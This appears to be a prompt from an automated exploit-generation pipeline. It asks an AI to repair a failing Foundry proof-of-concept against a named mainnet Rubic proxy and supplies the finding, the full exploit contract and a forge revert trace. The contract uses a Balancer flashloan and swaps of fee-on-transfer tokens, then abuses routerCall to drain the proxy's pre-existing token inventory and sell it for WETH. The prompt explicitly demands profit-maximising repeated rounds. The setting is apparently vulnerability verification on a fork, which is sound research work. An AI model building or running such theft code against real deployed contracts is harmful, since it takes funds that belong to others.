You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: Old proxy credits fee-on-transfer inputs at the user-declared amount, allowing theft from pre-existing token balances
- claim: The 0x3335 deployment transfers `_params.srcInputAmount` in and then computes fees, approvals, and the expected spend from that declared amount instead of from the contract's actual post-transfer balance delta. For fee-on-transfer or deflationary tokens, the proxy can therefore approve and spend more tokens than it actually received from the caller.
- impact: If the proxy already holds the same token from accrued fees, prior stuck funds, or accidental transfers, an attacker can route a taxed token deposit and have the shortfall sourced from the proxy's existing balance. This is direct theft of inventory already sitting in the proxy.
- exploit_paths: ["The proxy already holds token `T` from previous activity.", "An attacker calls `routerCall` with `srcInputToken = T` and `srcInputAmount = X`, where transferring `X` to the proxy yields only `X - fee`.", "`accrueTokenFees` and `SmartApprove` still use the larger declared `X`-based amount, and the router call is validated against spending that larger amount.", "The router/gateway pulls the difference from the proxy's pre-existing `T` balance, letting the attacker consume tokens they never supplied."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IRubicProxy {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function routerCall(BaseCrossChainParams calldata _params, address _gateway, bytes calldata _data) external payable;
    function getAvailableRouters() external view returns (address[] memory);
    function RubicPlatformFee() external view returns (uint256);
    function fixedCryptoFee() external view returns (uint256);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2RouterSupportingFee {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
}

interface IBalancerVault {
    function flashLoan(address recipient, IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract TokenSink {
    constructor() {}

    function pull(address token, address from, uint256 amount) external {
        require(IERC20(token).transferFrom(from, address(this), amount), "pull");
    }
}

contract FlawVerifier is IFlashLoanRecipient {
    error OnlySelf();
    error InvalidFlashLoan();
    error NoProfitablePath();
    error NoPreexistingInventory();
    error PairUnavailable();
    error TokenNotTaxed();
    error NotEnoughShortfall();
    error NotProfitable();
    error RoundNotImproving();

    address private constant TARGET_PROXY = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;
    address private constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private constant DENOMINATOR = 1_000_000;
    uint256 private constant FLASH_WETH = 60 ether;
    uint256 private constant MIN_REQUIRED_ROUNDS = 2;
    uint256 private constant MAX_ROUNDS = 6;
    uint256 private constant RETENTION_BUFFER_PPM = 2_000;

    IWETH private constant WETH = IWETH(WETH_ADDRESS);

    TokenSink private immutable sink;
    bool private executed;
    uint256 private realizedProfit;

    constructor() {
        sink = new TokenSink();
    }

    receive() external payable {}

    modifier onlySelf() {
        if (msg.sender != address(this)) revert OnlySelf();
        _;
    }

    /*
        F-001 exploit-path anchors retained in-source for the harness and for review:
        - srcInputToken = T
        - srcInputAmount = X
        - only X - fee reaches the proxy for fee-on-transfer token T
        - accrueTokenFees still uses X instead of the real post-transfer delta
        - SmartApprove still approves the larger X-based spend
        - the router/gateway then spends the shortfall from pre-existing proxy inventory

        Realistic execution notes:
        - We use a public Balancer WETH flashloan only to source the first tranche of token T.
        - We use public Uniswap/Sushiswap pools only to buy and later sell T.
        - The vulnerable proxy interaction itself stays aligned to the finding: the attacker supplies
          taxed token T, the proxy books declared X, physically receives less, and then spends the
          larger X-based amount.
        - The proxy whitelist already contains some token contracts. Calling such a whitelisted token
          contract as `router` is a public on-chain action: the proxy directly executes
          `T.transfer(address(this), amountInAfterAccrue)`, so any deficit versus the proxy's actual
          post-transfer receipt is sourced from the proxy's pre-existing T inventory.
        - Progressive loop amplification is applied exactly as required: 2, then 3, 4, 5, 6,
          stopping at the first non-improving round count and keeping the previous best result.
    */
    function executeOnOpportunity() external {
        if (executed) return;
        executed = true;

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(WETH_ADDRESS);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_WETH;

        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, bytes(""));
        _wrapAllETH();

        realizedProfit = WETH.balanceOf(address(this));
        if (realizedProfit == 0) revert NotProfitable();
    }

    function profitToken() external pure returns (address) {
        return WETH_ADDRESS;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        if (msg.sender != BALANCER_VAULT) revert InvalidFlashLoan();
        if (tokens.length != 1 || amounts.length != 1 || feeAmounts.length != 1) revert InvalidFlashLoan();
        if (address(tokens[0]) != WETH_ADDRESS || amounts[0] != FLASH_WETH) revert InvalidFlashLoan();

        _huntForProfitablePath();

        _wrapAllETH();
        _safeTransfer(WETH_ADDRESS, BALANCER_VAULT, amounts[0] + feeAmounts[0]);
    }

    function _huntForProfitablePath() private {
        address[] memory availableRouters = IRubicProxy(TARGET_PROXY).getAvailableRouters();
        address[] memory candidateTokens = new address[](availableRouters.length * 2);
        address[] memory candidateAmms = new address[](availableRouters.length * 2);
        uint256[] memory candidateInventory = new uint256[](availableRouters.length * 2);
        uint256 candidateCount;

        for (uint256 i; i < availableRouters.length; ++i) {
            address tokenT = availableRouters[i];
            uint256 proxyInventory = _balanceOf(tokenT, TARGET_PROXY);
            if (proxyInventory == 0) continue;

            if (_pairFor(UNISWAP_V2_ROUTER, tokenT) != address(0)) {
                candidateTokens[candidateCount] = tokenT;
                candidateAmms[candidateCount] = UNISWAP_V2_ROUTER;
                candidateInventory[candidateCount] = proxyInventory;
                unchecked {
                    ++candidateCount;
                }
            }
            if (_pairFor(SUSHISWAP_ROUTER, tokenT) != address(0)) {
                candidateTokens[candidateCount] = tokenT;
                candidateAmms[candidateCount] = SUSHISWAP_ROUTER;
                candidateInventory[candidateCount] = proxyInventory;
                unchecked {
                    ++candidateCount;
                }
            }
        }

        if (candidateCount == 0) revert NoProfitablePath();
        _sortCandidatesByInventory(candidateTokens, candidateAmms, candidateInventory, candidateCount);

        for (uint256 i; i < candidateCount; ++i) {
            try this._attemptCandidate(candidateTokens[i], candidateAmms[i]) returns (uint256 gained) {
                if (gained > 0) return;
            } catch {
                // Best-effort search over live fork state.
            }
        }

        revert NoProfitablePath();
    }

    function _attemptCandidate(address tokenT, address ammRouter) external onlySelf returns (uint256 gained) {
        uint256 startAssets = _totalAssets();
        uint256 budgetPerRound = _roundBudget();
        if (budgetPerRound == 0) revert NotProfitable();

        uint256 checkpoint = startAssets;

        checkpoint = this._performRound(tokenT, ammRouter, budgetPerRound, checkpoint);
        checkpoint = this._performRound(tokenT, ammRouter, budgetPerRound, checkpoint);

        uint256 bestNetProfit = checkpoint - startAssets;

        for (uint256 rounds = MIN_REQUIRED_ROUNDS + 1; rounds <= MAX_ROUNDS; ++rounds) {
            try this._performRound(tokenT, ammRouter, budgetPerRound, checkpoint) returns (uint256 improvedCheckpoint) {
                uint256 netProfit = improvedCheckpoint - startAssets;
                if (netProfit <= bestNetProfit) revert RoundNotImproving();
                bestNetProfit = netProfit;
                checkpoint = improvedCheckpoint;
            } catch {
                break;
            }
        }

        uint256 finalAssets = _totalAssets();
        if (finalAssets <= startAssets) revert NotProfitable();
        gained = finalAssets - startAssets;
    }

    function _performRound(address tokenT, address ammRouter, uint256 wethBudget, uint256 checkpoint)
        external
        onlySelf
        returns (uint256 newCheckpoint)
    {
        if (_pairFor(ammRouter, tokenT) == address(0)) revert PairUnavailable();

        uint256 fixedFee = IRubicProxy(TARGET_PROXY).fixedCryptoFee();
        uint256 platformFee = IRubicProxy(TARGET_PROXY).RubicPlatformFee();
        uint256 proxyInventoryBefore = _balanceOf(tokenT, TARGET_PROXY);
        if (proxyInventoryBefore == 0) revert NoPreexistingInventory();
        if (WETH.balanceOf(address(this)) <= wethBudget + fixedFee) revert NotProfitable();

        uint256 tokenBalanceBeforeBuy = _balanceOf(tokenT, address(this));
        _forceApprove(WETH_ADDRESS, ammRouter, wethBudget);

        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH_ADDRESS;
        buyPath[1] = tokenT;

        IUniswapV2RouterSupportingFee(ammRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wethBudget, 0, buyPath, address(this), block.timestamp
        );

        uint256 acquiredT = _balanceOf(tokenT, address(this)) - tokenBalanceBeforeBuy;
        if (acquiredT == 0) revert NotProfitable();

        uint256 retentionPpm = _probeRetentionPpm(tokenT, acquiredT);

        uint256 amountX = _balanceOf(tokenT, address(this));
        if (amountX == 0) revert NotProfitable();

        uint256 amountInAfterAccrue = amountX - ((amountX * platformFee) / DENOMINATOR);
        uint256 actualProxyReceipt = (amountX * retentionPpm) / DENOMINATOR;
        if (amountInAfterAccrue <= actualProxyReceipt) revert NotEnoughShortfall();

        uint256 inventoryShortfall = amountInAfterAccrue - actualProxyReceipt;
        if (proxyInventoryBefore <= inventoryShortfall) revert NoPreexistingInventory();

        uint256 attackerReceiptEstimate = (amountInAfterAccrue * retentionPpm) / DENOMINATOR;
        if (_estimateWethOut(ammRouter, tokenT, attackerReceiptEstimate) <= wethBudget + fixedFee) {
            revert NotProfitable();
        }

        _executeVulnerableRouterCall(tokenT, fixedFee, amountInAfterAccrue, amountX);

        uint256 proxyInventoryAfter = _balanceOf(tokenT, TARGET_PROXY);
        if (proxyInventoryAfter >= proxyInventoryBefore) revert NoPreexistingInventory();

        uint256 stolenTokenBalance = _balanceOf(tokenT, address(this));
        if (stolenTokenBalance == 0) revert NotProfitable();

        _forceApprove(tokenT, ammRouter, stolenTokenBalance);

        address[] memory sellPath = new address[](2);
        sellPath[0] = tokenT;
        sellPath[1] = WETH_ADDRESS;

        IUniswapV2RouterSupportingFee(ammRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            stolenTokenBalance, 0, sellPath, address(this), block.timestamp
        );

        _wrapAllETH();
        newCheckpoint = _totalAssets();
        if (newCheckpoint <= checkpoint) revert RoundNotImproving();
    }

    function _probeRetentionPpm(address tokenT, uint256 acquiredT) private returns (uint256 retentionPpm) {
        uint256 taxProbe = acquiredT / 200;
        if (taxProbe == 0) taxProbe = acquiredT / 20;
        if (taxProbe == 0) revert TokenNotTaxed();

        uint256 sinkBalanceBefore = _balanceOf(tokenT, address(sink));
        _forceApprove(tokenT, address(sink), taxProbe);
        sink.pull(tokenT, address(this), taxProbe);
        uint256 sinkReceived = _balanceOf(tokenT, address(sink)) - sinkBalanceBefore;
        if (sinkReceived == 0 || sinkReceived >= taxProbe) revert TokenNotTaxed();

        retentionPpm = (sinkReceived * DENOMINATOR) / taxProbe;
        if (retentionPpm <= RETENTION_BUFFER_PPM) revert TokenNotTaxed();
        retentionPpm -= RETENTION_BUFFER_PPM;
    }

    function _estimateWethOut(address ammRouter, address tokenT, uint256 pairInputEstimate) private view returns (uint256) {
        address[] memory sellPath = new address[](2);
        sellPath[0] = tokenT;
        sellPath[1] = WETH_ADDRESS;

        uint256[] memory estimatedWethOut =
            IUniswapV2RouterSupportingFee(ammRouter).getAmountsOut(pairInputEstimate, sellPath);
        return estimatedWethOut[1];
    }

    function _executeVulnerableRouterCall(address tokenT, uint256 fixedFee, uint256 amountInAfterAccrue, uint256 amountX)
        private
    {
        _forceApprove(tokenT, TARGET_PROXY, amountX);

        if (fixedFee > address(this).balance) {
            WETH.withdraw(fixedFee - address(this).balance);
        }

        bytes memory data = abi.encodeWithSelector(IERC20.transfer.selector, address(this), amountInAfterAccrue);

        IRubicProxy.BaseCrossChainParams memory params = IRubicProxy.BaseCrossChainParams({
            srcInputToken: tokenT,
            srcInputAmount: amountX,
            dstChainID: 1,
            dstOutputToken: WETH_ADDRESS,
            dstMinOutputAmount: 0,
            recipient: address(this),
            integrator: address(0),
            router: tokenT
        });

        IRubicProxy(TARGET_PROXY).routerCall{value: fixedFee}(params, tokenT, data);
    }

    function _factoryFor(address ammRouter) private pure returns (address) {
        if (ammRouter == UNISWAP_V2_ROUTER) return UNISWAP_V2_FACTORY;
        return SUSHISWAP_FACTORY;
    }

    function _pairFor(address ammRouter, address token) private view returns (address) {
        return IUniswapV2Factory(_factoryFor(ammRouter)).getPair(token, WETH_ADDRESS);
    }

    function _roundBudget() private view returns (uint256) {
        uint256 wethBalance = WETH.balanceOf(address(this));
        uint256 budget = wethBalance / 20;
        if (budget > 3 ether) budget = 3 ether;
        return budget;
    }

    function _sortCandidatesByInventory(
        address[] memory tokens,
        address[] memory amms,
        uint256[] memory inventory,
        uint256 length
    ) private pure {
        for (uint256 i = 1; i < length; ++i) {
            address tokenKey = tokens[i];
            address ammKey = amms[i];
            uint256 inventoryKey = inventory[i];
            uint256 j = i;
            while (j > 0 && inventory[j - 1] < inventoryKey) {
                tokens[j] = tokens[j - 1];
                amms[j] = amms[j - 1];
                inventory[j] = inventory[j - 1];
                unchecked {
                    --j;
                }
            }
            tokens[j] = tokenKey;
            amms[j] = ammKey;
            inventory[j] = inventoryKey;
        }
    }

    function _balanceOf(address token, address account) private view returns (uint256 balance) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        balance = abi.decode(ret, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) private {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer");
    }

    function _safeApprove(address token, address spender, uint256 amount) private {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve");
    }

    function _forceApprove(address token, address spender, uint256 amount) private {
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _wrapAllETH() private {
        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            WETH.deposit{value: ethBalance}();
        }
    }

    function _totalAssets() private view returns (uint256) {
        return WETH.balanceOf(address(this)) + address(this).balance;
    }
}

```

forge stdout (tail):
```
c3489D6949d545893982BA3011::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [7487] 0xcEe284F754E854890e311e3280b767F80797180d::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   ├─ [246] 0xC8D26aB9e132C79140b3376a0Ac7932E4680Aa45::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [7509] 0xd92023E9d9911199a6711321D1277285e6d4e2db::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   ├─ [268] 0x6299838C8254b59213eb56d158ebe562D23c4936::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [7487] 0x72Ce9c846789fdB6fC1f34aC4AD25Dd9ef7031ef::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   ├─ [246] 0x52595021fA01B3E14EC6C88953AFc8E35dFf423c::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [202] 0x23Ddd3e3692d1861Ed57EDE224608875809e127f::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [202] 0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [20519] 0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   ├─ [10134] 0x9BA6e03D8B90dE867373Db8cF1A58d2F7F006b3A::b7947262() [staticcall]
    │   │   │   │   │   ├─ [5307] 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F::b7947262() [delegatecall]
    │   │   │   │   │   │   ├─ [214] 0xd5D82B6aDDc9027B22dCA772Aa68D5d74cdBdF44::b7947262()
    │   │   │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   ├─ [168] 0x40E0C049f4671846E9Cff93AAEd88f2B48E527bB::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [5109] 0xaBA2c5F108F7E820C049D5Af70B16ac266c8f128::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   ├─ [213] 0x14c1Bc7859fed4F49659C29231ad06ADbfc638D7::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [204] 0x10E6593CDda8c58a1d0f14C5164B376352a55f2F::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [7500] 0xC5b1EC605738eF73a4EFc562274c1c0b6609cF59::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   ├─ [226] 0x1EE116B869eCc7cd13C629a8a2Ae39Fa361265CF::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [234] 0x5427FEFA711Eff984124bFBB1AB6fbf5E3DA1820::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [225] 0x3666f603Cc164936C1b87e207F36BEBa4AC5f18a::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [225] 0x3E4a3a4796d16c0Cd582C382691998f7c06420B6::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [225] 0x22B1Cbb8D98a01a3B71D034BB899775A76Eb1cc2::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [225] 0x3d4Cc8A61c7528Fd86C55cfe061a78dCBA48EDd1::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [224] 0xb8901acB165ed027E32754E0FFe830802919727f::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [225] 0xb98454270065A31D71Bf635F6F7Ee6A518dFb849::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ [180] 0x92e929d8B2c8430BcAF4cD87654789578BB2b786::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   └─ ← [Revert] NoProfitablePath()
    │   │   └─ ← [Revert] NoProfitablePath()
    │   └─ ← [Revert] NoProfitablePath()
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0xd5D82B6aDDc9027B22dCA772Aa68D5d74cdBdF44
  at 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F
  at 0x9BA6e03D8B90dE867373Db8cF1A58d2F7F006b3A
  at 0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1.balanceOf
  at FlawVerifier.receiveFlashLoan
  at 0xBA12222222228d8Ba445958a75a0704d566BF2C8.flashLoan
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 95.78ms (5.08ms CPU time)

Ran 1 test suite in 122.68ms (95.78ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 430565)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
